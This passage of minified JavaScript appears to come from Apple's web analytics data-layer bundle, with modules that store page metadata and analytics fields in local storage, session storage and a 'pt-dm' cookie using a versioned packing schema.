strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../config/index.js"),_set=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("../set.js"));exports.default=function readMeta(){if(_index.config.meta){for(var _config$meta=_index.config.meta,key=_config$meta.key,selector=_config$meta.selector,keyAttribute=_config$meta.keyAttribute,keyPrefix=_config$meta.keyPrefix,valueAttribute=_config$meta.valueAttribute,result={},metas=document.querySelectorAll(selector),i=0;i<metas.length;i++){result[metas[i].getAttribute(keyAttribute).replace(keyPrefix,"")]=metas[i].getAttribute(valueAttribute)}(0,_set.default)(key,result)}}},{"../config/index.js":39,"../set.js":68}],45:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../config/index.js"),_set=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("../set.js"));exports.default=function readPageDataModel(){if(_index.config.pageDataModel){var result={},element=window.document.querySelector(_index.config.pageDataModel.selector);try{result=JSON.parse(element.textContent)}catch(e){}(0,_set.default)(_index.config.pageDataModel.key,result)}}},{"../config/index.js":39,"../set.js":68}],46:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.KEYS=void 0,Object.defineProperty(exports,"get",{enumerable:!0,get:function get(){return _get.default}}),Object.defineProperty(exports,"init",{enumerable:!0,get:function get(){return _init.default}}),Object.defineProperty(exports,"remove",{enumerable:!0,get:function get(){return _remove.default}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.default}});var KEYS=function _interopRequireWildcard(e,r){if(!r&&e&&e.__esModule)return e;if(null===e||"object"!=_typeof(e)&&"function"!=typeof e)return{default:e};var t=_getRequireWildcardCache(r);if(t&&t.has(e))return t.get(e);var n={__proto__:null},a=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var u in e)if("default"!==u&&Object.prototype.hasOwnProperty.call(e,u)){var i=a?Object.getOwnPropertyDescriptor(e,u):null;i&&(i.get||i.set)?Object.defineProperty(n,u,i):n[u]=e[u]}return n.default=e,t&&t.set(e,n),n}(require("@apple/analytics-data-layer-keys"));exports.KEYS=KEYS;var _init=_interopRequireDefault(require("./init.js")),_get=_interopRequireDefault(require("./get.js")),_set=_interopRequireDefault(require("./set.js")),_remove=_interopRequireDefault(require("./remove.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}function _getRequireWildcardCache(e){if("function"!=typeof WeakMap)return null;var r=new WeakMap,t=new WeakMap;return(_getRequireWildcardCache=function _getRequireWildcardCache(e){return e?t:r})(e)}},{"./get.js":42,"./init.js":47,"./remove.js":59,"./set.js":68,"@apple/analytics-data-layer-keys":37}],47:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("./localStore/index.js"),_index2=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./hydrate/index.js")),_index3=require("./localStoreSync/index.js"),_index4=require("./config/index.js");var initDone=!1;exports.default=function init(config){initDone||(initDone=!0,(0,_index4.set)(config),(0,_index2.default)(),_index4.config.persisted&&(0,_index.registerStoreEventCallback)(_index3.syncLocalStoreToState))}},{"./config/index.js":39,"./hydrate/index.js":43,"./localStore/index.js":51,"./localStoreSync/index.js":56}],48:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.expiryKey=exports.expiryExtendTimeout=exports.expiryDuration=exports.dataKey=void 0;exports.dataKey="mk_epub",exports.expiryKey="mk_epub_expiry",exports.expiryDuration=72e5,exports.expiryExtendTimeout=3e5},{}],49:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var extendExpiryTimer,_analyticsUtils=require("@apple/analytics-utils"),_config=require("./config.js"),_isExpired=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./isExpired.js"));var extend=function extend(force){!force&&(0,_isExpired.default)()||(_analyticsUtils.localStorage.set(_config.expiryKey,Date.now()+_config.expiryDuration),extendExpiryTimer=setTimeout(extend,_config.expiryExtendTimeout))};exports.default=function expiryExtender(){clearTimeout(extendExpiryTimer),extend(!0)}},{"./config.js":48,"./isExpired.js":52,"@apple/analytics-utils":190}],50:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_config=require("./config.js"),_remove=_interopRequireDefault(require("./remove.js")),_isExpired=_interopRequireDefault(require("./isExpired.js")),_expiryExtender=_interopRequireDefault(require("./expiryExtender.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}exports.default=function get(){if((0,_isExpired.default)())return(0,_remove.default)(),{};var data=_analyticsUtils.localStorageJson.get(_config.dataKey);return data?((0,_expiryExtender.default)(),data):((0,_remove.default)(),{})}},{"./config.js":48,"./expiryExtender.js":49,"./isExpired.js":52,"./remove.js":54,"@apple/analytics-utils":190}],51:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"get",{enumerable:!0,get:function get(){return _get.default}}),Object.defineProperty(exports,"registerStoreEventCallback",{enumerable:!0,get:function get(){return _registerStoreEventCallback.default}}),Object.defineProperty(exports,"remove",{enumerable:!0,get:function get(){return _remove.default}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.default}});var _get=_interopRequireDefault(require("./get.js")),_set=_interopRequireDefault(require("./set.js")),_remove=_interopRequireDefault(require("./remove.js")),_registerStoreEventCallback=_interopRequireDefault(require("./registerStoreEventCallback.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./get.js":50,"./registerStoreEventCallback.js":53,"./remove.js":54,"./set.js":55}],52:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_config=require("./config.js");exports.default=function isExpired(){return(Number(_analyticsUtils.localStorage.get(_config.expiryKey))||0)<Date.now()}},{"./config.js":48,"@apple/analytics-utils":190}],53:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _config=require("./config.js");exports.default=function registerStoreEventCallback(callback){"function"==typeof callback&&window.addEventListener("storage",function storeEventListener(callback){return function(event){event.key===_config.dataKey&&callback()}}(callback))}},{"./config.js":48}],54:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_config=require("./config.js");exports.default=function remove(){_analyticsUtils.localStorage.remove(_config.expiryKey),_analyticsUtils.localStorage.remove(_config.dataKey)}},{"./config.js":48,"@apple/analytics-utils":190}],55:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_config=require("./config.js"),_expiryExtender=_interopRequireDefault(require("./expiryExtender.js")),_remove=_interopRequireDefault(require("./remove.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}exports.default=function set(data){data&&"object"===_typeof(data)&&Object.keys(data).length?((0,_expiryExtender.default)(),_analyticsUtils.localStorageJson.set(_config.dataKey,data)):(0,_remove.default)()}},{"./config.js":48,"./expiryExtender.js":49,"./remove.js":54,"@apple/analytics-utils":190}],56:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"syncLocalStoreToState",{enumerable:!0,get:function get(){return _syncLocalStoreToState.default}}),Object.defineProperty(exports,"syncStateToLocalStore",{enumerable:!0,get:function get(){return _syncStateToLocalStore.default}});var _syncLocalStoreToState=_interopRequireDefault(require("./syncLocalStoreToState.js")),_syncStateToLocalStore=_interopRequireDefault(require("./syncStateToLocalStore.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./syncLocalStoreToState.js":57,"./syncStateToLocalStore.js":58}],57:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../localStore/index.js"),_state=require("../state.js"),_index2=require("../config/index.js");exports.default=function syncLocalStoreToState(){_index2.config.persisted&&(0,_state.set)([_index2.config.persisted.key],(0,_index.get)())}},{"../config/index.js":39,"../localStore/index.js":51,"../state.js":69}],58:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../localStore/index.js"),_state=require("../state.js"),_index2=require("../config/index.js");exports.default=function syncStateToLocalStore(){_index2.config.persisted&&(0,_index.set)((0,_state.get)([_index2.config.persisted.key]))}},{"../config/index.js":39,"../localStore/index.js":51,"../state.js":69}],59:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_state=require("./state.js"),_index=require("./localStoreSync/index.js"),_index2=require("./sessionStoreSync/index.js"),_index3=require("./config/index.js");exports.default=function remove(path){var formattedPath=_analyticsUtils.objectPath.formatPath(path);(0,_state.remove)(formattedPath),_index3.config.persisted&&formattedPath[0]===_index3.config.persisted.key&&(0,_index.syncStateToLocalStore)(),_index3.config.sessionStore&&formattedPath[0]===_index3.config.sessionStore.key&&(0,_index2.syncStateToSessionStore)()}},{"./config/index.js":39,"./localStoreSync/index.js":56,"./sessionStoreSync/index.js":65,"./state.js":69,"@apple/analytics-utils":190}],60:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.dataKey=void 0;exports.dataKey="mk_epub"},{}],61:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_config=require("./config.js"),_remove=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./remove.js"));exports.default=function get(){var data=_analyticsUtils.sessionStorageJson.get(_config.dataKey);return data||((0,_remove.default)(),{})}},{"./config.js":60,"./remove.js":63,"@apple/analytics-utils":190}],62:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"get",{enumerable:!0,get:function get(){return _get.default}}),Object.defineProperty(exports,"remove",{enumerable:!0,get:function get(){return _remove.default}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.default}});var _get=_interopRequireDefault(require("./get.js")),_set=_interopRequireDefault(require("./set.js")),_remove=_interopRequireDefault(require("./remove.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./get.js":61,"./remove.js":63,"./set.js":64}],63:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_config=require("./config.js");exports.default=function remove(){_analyticsUtils.sessionStorage.remove(_config.dataKey)}},{"./config.js":60,"@apple/analytics-utils":190}],64:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_config=require("./config.js"),_remove=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./remove.js"));function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}exports.default=function set(data){data&&"object"===_typeof(data)&&Object.keys(data).length?_analyticsUtils.sessionStorageJson.set(_config.dataKey,data):(0,_remove.default)()}},{"./config.js":60,"./remove.js":63,"@apple/analytics-utils":190}],65:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"syncSessionStoreToState",{enumerable:!0,get:function get(){return _syncSessionStoreToState.default}}),Object.defineProperty(exports,"syncStateToSessionStore",{enumerable:!0,get:function get(){return _syncStateToSessionStore.default}});var _syncSessionStoreToState=_interopRequireDefault(require("./syncSessionStoreToState.js")),_syncStateToSessionStore=_interopRequireDefault(require("./syncStateToSessionStore.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./syncSessionStoreToState.js":66,"./syncStateToSessionStore.js":67}],66:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../sessionStore/index.js"),_state=require("../state.js"),_index2=require("../config/index.js");exports.default=function syncSessionStoreToState(){_index2.config.sessionStore&&(0,_state.set)([_index2.config.sessionStore.key],(0,_index.get)())}},{"../config/index.js":39,"../sessionStore/index.js":62,"../state.js":69}],67:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../sessionStore/index.js"),_state=require("../state.js"),_index2=require("../config/index.js");exports.default=function syncStateToSessionStore(){_index2.config.sessionStore&&(0,_index.set)((0,_state.get)([_index2.config.sessionStore.key]))}},{"../config/index.js":39,"../sessionStore/index.js":62,"../state.js":69}],68:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_state=require("./state.js"),_index=require("./localStoreSync/index.js"),_index2=require("./sessionStoreSync/index.js"),_index3=require("./config/index.js");exports.default=function set(path,value){var formattedPath=_analyticsUtils.objectPath.formatPath(path);(0,_state.set)(formattedPath,value),_index3.config.persisted&&formattedPath[0]===_index3.config.persisted.key&&(0,_index.syncStateToLocalStore)(),_index3.config.sessionStore&&formattedPath[0]===_index3.config.sessionStore.key&&(0,_index2.syncStateToSessionStore)()}},{"./config/index.js":39,"./localStoreSync/index.js":56,"./sessionStoreSync/index.js":65,"./state.js":69,"@apple/analytics-utils":190}],69:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.set=exports.reset=exports.remove=exports.get=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_index=require("./utils/index.js"),state={};exports.get=function get(path){return _analyticsUtils.objectPath.get(state,path)},exports.set=function set(path,value){state=_analyticsUtils.objectPath.set(state,path,value)},exports.remove=function remove(path){state=_analyticsUtils.objectPath.remove(state,path)},exports.reset=function reset(newState){state=(0,_index.isObject)(newState)?newState:{}}},{"./utils/index.js":70,"@apple/analytics-utils":190}],70:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"isObject",{enumerable:!0,get:function get(){return _isObject.default}}),Object.defineProperty(exports,"isValidObject",{enumerable:!0,get:function get(){return _isValidObject.default}});var _isObject=_interopRequireDefault(require("./isObject.js")),_isValidObject=_interopRequireDefault(require("./isValidObject.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./isObject.js":71,"./isValidObject.js":72}],71:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function isObject(obj){return!(!obj||"object"!==_typeof(obj)||Array.isArray(obj))}},{}],72:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _isObject=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./isObject.js"));exports.default=function isValidObject(obj,mandatoryProps){return(0,_isObject.default)(obj)&&Array.isArray(mandatoryProps)&&mandatoryProps.every((function(prop){return obj[prop]}))}},{"./isObject.js":71}],73:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.setup=exports.save=exports.load=exports.clearAll=void 0;var _utils=require("./utils.js"),_index=require("./schema/index.js"),_index2=require("./transformers/index.js"),_index3=require("./storage/index.js"),_syncTabs=require("./storage/syncTabs.js"),_setDefaults=require("./setDefaults.js");exports.setup=function setup(_ref){var window=_ref.window;(0,_syncTabs.handleNewPage)({window:window});var onStorage=(0,_syncTabs.handleStorageEvent)({schema:(0,_index.loadSchema)((0,_setDefaults.setDefaults)()).schema,window:window}),handleOnStorage=function handleOnStorage(event){onStorage(event)};return window.addEventListener("storage",handleOnStorage),function(){window.removeEventListener("storage",handleOnStorage)}},exports.save=(0,_utils.pipe)(_setDefaults.setDefaults,_index.loadSchema,_index2.pack,_index3.store),exports.load=_index3.retrieve,exports.clearAll=_index3.clear},{"./schema/index.js":75,"./setDefaults.js":77,"./storage/index.js":79,"./storage/syncTabs.js":82,"./transformers/index.js":84,"./utils.js":87}],74:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.setup=exports.save=exports.load=exports.clearAll=void 0;var _asUtilities=require("@aos/as-utilities"),api=function _interopRequireWildcard(e,r){if(!r&&e&&e.__esModule)return e;if(null===e||"object"!=_typeof(e)&&"function"!=typeof e)return{default:e};var t=_getRequireWildcardCache(r);if(t&&t.has(e))return t.get(e);var n={__proto__:null},a=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var u in e)if("default"!==u&&Object.prototype.hasOwnProperty.call(e,u)){var i=a?Object.getOwnPropertyDescriptor(e,u):null;i&&(i.get||i.set)?Object.defineProperty(n,u,i):n[u]=e[u]}return n.default=e,t&&t.set(e,n),n}(require("./api.js")),_excluded=["window","cookie"];function _getRequireWildcardCache(e){if("function"!=typeof WeakMap)return null;var r=new WeakMap,t=new WeakMap;return(_getRequireWildcardCache=function _getRequireWildcardCache(e){return e?t:r})(e)}function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function _objectWithoutProperties(source,excluded){if(null==source)return{};var key,i,target=function _objectWithoutPropertiesLoose(source,excluded){if(null==source)return{};var key,i,target={},sourceKeys=Object.keys(source);for(i=0;i<sourceKeys.length;i++)key=sourceKeys[i],excluded.indexOf(key)>=0||(target[key]=source[key]);return target}(source,excluded);if(Object.getOwnPropertySymbols){var sourceSymbolKeys=Object.getOwnPropertySymbols(source);for(i=0;i<sourceSymbolKeys.length;i++)key=sourceSymbolKeys[i],excluded.indexOf(key)>=0||Object.prototype.propertyIsEnumerable.call(source,key)&&(target[key]=source[key])}return target}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}exports.setup=function setup(){var _ref$window=(arguments.length>0&&void 0!==arguments[0]?arguments[0]:{}).window,window=void 0===_ref$window?globalThis.window:_ref$window;return api.setup({window:window})},exports.save=function save(){var _ref2=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},_ref2$window=_ref2.window,window=void 0===_ref2$window?globalThis.window:_ref2$window,_ref2$cookie=_ref2.cookie,cookie=void 0===_ref2$cookie?_asUtilities.cookie:_ref2$cookie,data=_ref2.data,options=_ref2.options;return api.save({window:window,cookie:cookie,data:_objectSpread({},data),options:_objectSpread({},options)})},exports.load=function load(){var _ref3=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},_ref3$window=_ref3.window,window=void 0===_ref3$window?globalThis.window:_ref3$window,_ref3$cookie=_ref3.cookie,cookie=void 0===_ref3$cookie?_asUtilities.cookie:_ref3$cookie;return api.load({window:window,cookie:cookie})},exports.clearAll=function clearAll(){var _ref4=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},_ref4$window=_ref4.window,window=void 0===_ref4$window?globalThis.window:_ref4$window,_ref4$cookie=_ref4.cookie,cookie=void 0===_ref4$cookie?_asUtilities.cookie:_ref4$cookie,options=_objectWithoutProperties(_ref4,_excluded);return api.clearAll({window:window,cookie:cookie,options:options})}},{"./api.js":73,"@aos/as-utilities":1}],75:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.loadSchema=void 0;var versions={v1:require("./v1.js").v1},schema=function schema(version){return version?versions.hasOwnProperty(version)?versions[version]:null:versions};exports.loadSchema=function loadSchema(state){return state.options&&state.options.version?state.schema=schema(state.options.version):state.allSchemas=schema(),state}},{"./v1.js":76}],76:[function(require,module,exports){"use strict";function _slicedToArray(arr,i){return function _arrayWithHoles(arr){if(Array.isArray(arr))return arr}(arr)||function _iterableToArrayLimit(r,l){var t=null==r?null:"undefined"!=typeof Symbol&&r[Symbol.iterator]||r["@@iterator"];if(null!=t){var e,n,i,u,a=[],f=!0,o=!1;try{if(i=(t=t.call(r)).next,0===l){if(Object(t)!==t)return;f=!1}else for(;!(f=(e=i.call(t)).done)&&(a.push(e.value),a.length!==l);f=!0);}catch(r){o=!0,n=r}finally{try{if(!f&&null!=t.return&&(u=t.return(),Object(u)!==u))return}finally{if(o)throw n}}return a}}(arr,i)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr,i)||function _nonIterableRest(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}Object.defineProperty(exports,"__esModule",{value:!0}),exports.v1=void 0;var maxLength=function maxLength(max){return function(str){return str.slice(0,max)}},id=function id(x){return x},separators_primary="~",separators_secondary="^",separators_tertiary="::";exports.v1={prefix:"v1",data:[{key:"uuid",map:"x",mergeDefault:"override",validStorage:["session","cookie"],syncTabs:!1,clean:function clean(x){return x}},{key:"minor",map:"m",mergeDefault:"override",validStorage:["session","cookie"],syncTabs:!0,clean:id},{key:"pageName",map:"n",mergeDefault:"override",validStorage:["session","cookie"],syncTabs:!1,clean:maxLength(120)},{key:"area",map:"r",mergeDefault:"override",validStorage:["session","cookie"],syncTabs:!1,clean:id},{key:"api",map:"a",mergeDefault:"append",validStorage:["session"],syncTabs:!0,prePack:function prePack(arr){return arr.map((function(_ref){var type=_ref.type,value=_ref.value;return type+separators_tertiary+value})).join(separators_secondary)},clean:maxLength(600),postPack:function postPack(data){return data.split(separators_secondary).map((function(item){var _item$split2=_slicedToArray(item.split(separators_tertiary),2);return{type:_item$split2[0],value:_item$split2[1]}}))}},{key:"beacon",map:"b",mergeDefault:"merge",validStorage:["session"],syncTabs:!0,prePack:function prePack(obj){return Object.entries(obj).filter((function(_ref2){var key=_slicedToArray(_ref2,1)[0];return/^[eVar|prop|events|products]/.test(key)})).map((function(_ref4){var _ref5=_slicedToArray(_ref4,2),key=_ref5[0],value=_ref5[1];return key+separators_tertiary+value})).join(separators_secondary)},clean:id,postPack:function postPack(str){return str.split(separators_secondary).reduce((function(beacon,current){var _current$split2=_slicedToArray(current.split(separators_tertiary),2),key=_current$split2[0],value=_current$split2[1];return beacon[key]=value,beacon}),{})}}],settings:{sessionName:"pt-dm",cookieName:"pt-dm",separator:separators_primary,transformers:["mergeExisting","mapToSchema","compress"]}}},{}],77:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}Object.defineProperty(exports,"__esModule",{value:!0}),exports.setDefaults=void 0;exports.setDefaults=function setDefaults(){var state=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return state.options=_objectSpread(_objectSpread({},{origin:"same",version:"v1",minor:"2"}),state.options),state}},{}],78:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.clearSession=exports.clearLocal=exports.clearCookie=void 0;exports.clearCookie=function clearCookie(_ref){var key=_ref.key,cookieDomain=_ref.cookieDomain,cookie=_ref.cookie,options={secure:!0,sameSite:"strict",path:"/",expires:new Date("Thu, 01 Jan 1970 00:00:01 GMT")};cookieDomain&&(options.domain=cookieDomain),cookie.set(key,"",options)},exports.clearSession=function clearSession(_ref2){var key=_ref2.key;_ref2.window.sessionStorage.removeItem(key)},exports.clearLocal=function clearLocal(_ref3){var key=_ref3.key;_ref3.window.localStorage.removeItem(key)}},{}],79:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.store=exports.storage=exports.retrieve=exports.clear=void 0;var _index=require("../schema/index.js"),_index2=require("../transformers/index.js"),_utils=require("../utils.js"),_setDefaults=require("../setDefaults.js"),_save=require("./save.js"),_load=require("./load.js"),_clear=require("./clear.js"),_syncTabs=require("./syncTabs.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}var store=exports.store=function store(state){if(!state||!state.transformed||""===state.transformed)return!1;if("cookie"===state.destination){var args={cookie:state.cookie,key:state.schema.settings.cookieName,value:state.transformed};state.options&&state.options.cookieDomain&&(args.cookieDomain=state.options.cookieDomain),(0,_save.saveCookie)(args)}else(0,_save.saveSession)({window:state.window,key:state.schema.settings.sessionName,value:state.transformed}),state.transformedSync&&""!==state.transformedSync&&(0,_syncTabs.syncSave)({window:state.window,value:state.transformedSync});return!0},mergeData=function mergeData(_ref){var schema=_ref.schema,sessionData=_ref.sessionData,cookieData=_ref.cookieData,result=null,has=function has(data){return 